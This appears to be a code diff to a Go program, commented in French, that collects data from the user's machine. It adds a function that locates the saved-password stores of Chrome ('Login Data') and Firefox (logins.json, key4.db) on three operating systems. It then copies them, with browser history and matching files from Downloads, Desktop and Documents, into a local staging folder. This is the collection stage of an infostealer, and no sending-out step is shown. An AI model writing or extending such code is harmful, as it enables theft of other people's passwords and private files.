@@ -10,6 +10,7 @@ import (
 	"sync"
 )
 
+// Vérifie les navigateurs installés
 func CheckInstalledBrowsers() map[string]string {
 	var browsers = map[string]string{}
 	installedBrowsers := make(map[string]string)
@@ -47,7 +48,6 @@ func CheckInstalledBrowsers() map[string]string {
 
 	fmt.Println("Vérification des navigateurs installés :")
 
-	// Lancer une goroutine pour chaque navigateur
 	for name, path := range browsers {
 		wg.Add(1)
 		go func(browserName, browserPath string) {
@@ -63,11 +63,12 @@ func CheckInstalledBrowsers() map[string]string {
 		}(name, path)
 	}
 
-	wg.Wait() // Attendre que toutes les goroutines aient fini
+	wg.Wait()
 
 	return installedBrowsers
 }
 
+// Récupère les chemins des fichiers d'historique des navigateurs
 func GetHistoryFilePath(browser string) ([]string, error) {
 	var filePaths []string
 	userHome, err := os.UserHomeDir()
@@ -108,8 +109,6 @@ func GetHistoryFilePath(browser string) ([]string, error) {
 			basePath = filepath.Join(userHome, `.config/BraveSoftware/Brave-Browser/Default`)
 		}
 
-	// Ajoutez des chemins pour d'autres navigateurs de manière similaire
-
 	default:
 		return nil, fmt.Errorf("navigateur non pris en charge : %s", browser)
 	}
@@ -126,6 +125,47 @@ func GetHistoryFilePath(browser string) ([]string, error) {
 
 	if err != nil {
 		return nil, fmt.Errorf("erreur lors de la recherche des fichiers SQL : %v", err)
+	}
+
+	return filePaths, nil
+}
+
+// Récupère les fichiers de mots de passe
+func GetPasswordFiles(browser string) ([]string, error) {
+	var filePaths []string
+	userHome, err := os.UserHomeDir()
+	if err != nil {
+		return nil, fmt.Errorf("erreur lors de la récupération du répertoire personnel de l'utilisateur : %v", err)
+	}
+
+	var basePath string
+
+	switch browser {
+	case "Google Chrome":
+		switch runtime.GOOS {
+		case "windows":
+			basePath = filepath.Join(userHome, `AppData\Local\Google\Chrome\User Data\Default`)
+		case "darwin":
+			basePath = filepath.Join(userHome, `Library/Application Support/Google/Chrome/Default`)
+		case "linux":
+			basePath = filepath.Join(userHome, `.config/google-chrome/Default`)
+		}
+		filePaths = append(filePaths, filepath.Join(basePath, "Login Data"))
+
+	case "Mozilla Firefox":
+		switch runtime.GOOS {
+		case "windows":
+			basePath = filepath.Join(userHome, `AppData\Roaming\Mozilla\Firefox\Profiles`)
+		case "darwin":
+			basePath = filepath.Join(userHome, `Library/Application Support/Firefox/Profiles`)
+		case "linux":
+			basePath = filepath.Join(userHome, `.mozilla/firefox`)
+		}
+		filePaths = append(filePaths, filepath.Join(basePath, "logins.json"))
+		filePaths = append(filePaths, filepath.Join(basePath, "key4.db"))
+
+	default:
+		return nil, fmt.Errorf("navigateur non pris en charge : %s", browser)
 	}
 
 	return filePaths, nil
@@ -153,7 +193,7 @@ func CopyFile(src, dst string) error {
 	return nil
 }
 
-// GetFiles récupère les fichiers d'un répertoire selon une liste d'extensions et de noms
+// Obtenir les fichiers d'un répertoire selon une liste d'extensions et de noms
 func GetFiles(dir string, extensions, names []string) ([]string, error) {
 	var result []string
 
@@ -165,10 +205,8 @@ func GetFiles(dir string, extensions, names []string) ([]string, error) {
 			return nil
 		}
 
-		// Vérifie les extensions
 		for _, ext := range extensions {
 			if filepath.Ext(path) == ext {
-				// Vérifie si le nom du fichier contient un des noms dans la liste
 				for _, name := range names {
 					if strings.Contains(strings.ToLower(filepath.Base(path)), strings.ToLower(name)) {
 						result = append(result, path)
@@ -188,7 +226,7 @@ func GetFiles(dir string, extensions, names []string) ([]string, error) {
 	return result, nil
 }
 
-// ClearDataFolder vide le contenu du dossier DATA en supprimant tous les fichiers et sous-dossiers
+// Vider le contenu du dossier DATA
 func ClearDataFolder(folderName string) error {
 	err := filepath.Walk(folderName, func(path string, info os.FileInfo, err error) error {
 		if err != nil {
@@ -205,7 +243,7 @@ func ClearDataFolder(folderName string) error {
 	return err
 }
 
-// Fonction pour créer les sous-dossiers dans DATA
+// Créer les sous-dossiers dans DATA
 func CreateSubfolders(baseFolder string) error {
 	subfolders := []string{
 		"Downloads",
@@ -223,8 +261,8 @@ func CreateSubfolders(baseFolder string) error {
 	return nil
 }
 
+// Traiter les données dans le dossier DATA
 func ProcessData(dataFolder string, extensions, names []string) error {
-	// Créer le dossier DATA s'il n'existe pas
 	if _, err := os.Stat(dataFolder); os.IsNotExist(err) {
 		err := os.Mkdir(dataFolder, 0755)
 		if err != nil {
@@ -232,7 +270,6 @@ func ProcessData(dataFolder string, extensions, names []string) error {
 		}
 	}
 
-	// Dossier pour les navigateurs
 	browsersFolder := filepath.Join(dataFolder, "Navigateurs")
 	if _, err := os.Stat(browsersFolder); os.IsNotExist(err) {
 		err := os.Mkdir(browsersFolder, 0755)
@@ -241,12 +278,9 @@ func ProcessData(dataFolder string, extensions, names []string) error {
 		}
 	}
 
-	// Vérifier les navigateurs installés
 	installedBrowsers := CheckInstalledBrowsers()
 
-	// Pour chaque navigateur installé, récupérer tous les fichiers SQL
 	for browser := range installedBrowsers {
-		// Créer un sous-dossier pour chaque navigateur
 		browserFolder := filepath.Join(browsersFolder, browser)
 		if _, err := os.Stat(browserFolder); os.IsNotExist(err) {
 			err := os.Mkdir(browserFolder, 0755)
@@ -268,7 +302,6 @@ func ProcessData(dataFolder string, extensions, names []string) error {
 			} else {
 				fmt.Printf("Fichier trouvé à l'emplacement : %s\n", filePath)
 
-				// Copier le fichier dans le sous-dossier du navigateur
 				destination := filepath.Join(browserFolder, filepath.Base(filePath))
 				err := CopyFile(filePath, destination)
 				if err != nil {
@@ -278,9 +311,31 @@ func ProcessData(dataFolder string, extensions, names []string) error {
 				}
 			}
 		}
+
+		// Récupérer les fichiers de mots de passe et les copier
+		passwordFiles, err := GetPasswordFiles(browser)
+		if err != nil {
+			fmt.Printf("Erreur lors de la récupération des fichiers de mots de passe pour %s : %v\n", browser, err)
+			continue
+		}
+
+		for _, filePath := range passwordFiles {
+			if _, err := os.Stat(filePath); os.IsNotExist(err) {
+				fmt.Printf("Aucun fichier trouvé à l'emplacement : %s\n", filePath)
+			} else {
+				fmt.Printf("Fichier trouvé à l'emplacement : %s\n", filePath)
+
+				destination := filepath.Join(browserFolder, filepath.Base(filePath))
+				err := CopyFile(filePath, destination)
+				if err != nil {
+					fmt.Printf("Erreur lors de la copie du fichier de mots de passe de %s : %v\n", browser, err)
+				} else {
+					fmt.Printf("Le fichier de mots de passe de %s a été copié dans %s\n", browser, destination)
+				}
+			}
+		}
 	}
 
-	// Copier les fichiers selon les critères spécifiés
 	err := CopyFilesToUserDirectories(dataFolder, extensions, names)
 	if err != nil {
 		return fmt.Errorf("erreur lors de la copie des fichiers : %v", err)
@@ -304,7 +359,6 @@ func CopyFilesToUserDirectories(dataFolder string, extensions, names []string) e
 		filepath.Join(userHome, "Documents"),
 	}
 
-	// Créer les sous-dossiers dans DATA
 	subFolders := []string{"Downloads", "Desktop", "Documents", "Navigateurs"}
 	for _, folder := range subFolders {
 		err := os.MkdirAll(filepath.Join(dataFolder, folder), 0755)
@@ -313,9 +367,8 @@ func CopyFilesToUserDirectories(dataFolder string, extensions, names []string) e
 		}
 	}
 
-	var wg sync.WaitGroup // WaitGroup pour gérer les goroutines
+	var wg sync.WaitGroup
 
-	// Pour chaque répertoire, lancer une goroutine pour chercher et copier les fichiers
 	for _, dir := range directories {
 		wg.Add(1)
 
@@ -330,7 +383,6 @@ func CopyFilesToUserDirectories(dataFolder string, extensions, names []string) e
 				return
 			}
 
-			// Copier chaque fichier trouvé
 			for _, filePath := range files {
 				fileName := filepath.Base(filePath)
 				var destinationDir string
@@ -355,9 +407,9 @@ func CopyFilesToUserDirectories(dataFolder string, extensions, names []string) e
 					fmt.Printf("Fichier %s copié dans %s\n", fileName, destinationDir)
 				}
 			}
-		}(dir) // Passer le répertoire à la goroutine
+		}(dir)
 	}
 
-	wg.Wait() // Attendre la fin de toutes les goroutines
+	wg.Wait()
 	return nil
 }
